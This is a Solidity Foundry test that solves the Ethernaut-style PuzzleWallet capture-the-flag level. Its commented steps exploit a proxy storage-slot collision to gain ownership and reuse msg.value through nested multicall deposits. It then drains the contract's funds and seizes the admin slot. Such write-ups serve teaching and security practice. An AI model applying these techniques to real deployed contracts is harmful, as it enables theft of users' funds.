// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../Utils.sol";

// this interface is a composition of
// PuzzleProxy and PuzzleWallet
interface ITarget {
  function proposeNewAdmin(address) external;
  function addToWhitelist(address) external;
  function multicall(bytes[] calldata) external payable;
  function execute(address, uint256, bytes memory) external;
  function setMaxBalance(uint256) external;
}

contract PuzzleWalletTest is Test {
  address internal challengeAddress;

  function setUp() public {
    challengeAddress = utils.createLevelInstance(0x5ef1FFD3b864FEe330EB6f28A55f333D68C4cc16, 0.001 ether);
  }

  function testExploit() public {
    ITarget target = ITarget(challengeAddress);
    // anybody can call this one
    // will switch slot0 which is pendingAdmin and owner
    target.proposeNewAdmin(address(this));

    // now we can be added to the whitelist (we are the owner)
    target.addToWhitelist(address(this));

    // we want to bundle dhe same deposit twice in this way
    // multicall_0 - deposit
    //             - multicall_1 - deposit

    // let's craft the deposit call
    bytes memory depositCalldata = abi.encodeWithSignature("deposit()");

    // bundle deposit into into multicall_1
    bytes[] memory multicall1Params = new bytes[](1);
    multicall1Params[0] = depositCalldata;
    bytes memory multicall1CallData = abi.encodeWithSignature("multicall(bytes[])", multicall1Params);

    // bundle deposit (again) and multicall_1
    bytes[] memory multicall0Params = new bytes[](2);
    multicall0Params[0] = depositCalldata;    // reusing deposit
    multicall0Params[1] = multicall1CallData; // are you confused enough?

    // now we can do the call
    // while we have a msg.value of 0.001 ether,
    // deposit() will be called twice,
    // giving us a balance of 0.002 ether
    target.multicall{value: 0.001 ether}(multicall0Params);

    // as our balance is 0.002, we can call execute(), draining the contract
    // don't forget to set up receive() in this contract
    bytes memory b;
    target.execute(address(this), 0.002 ether, b);

    // and now we can modify slot1 which is admin/maxBalance
    target.setMaxBalance(uint160(address(this)));

    utils.submitLevelInstance(challengeAddress);
  }

  // get the funds or the attack will revert
  receive() external payable {}
}
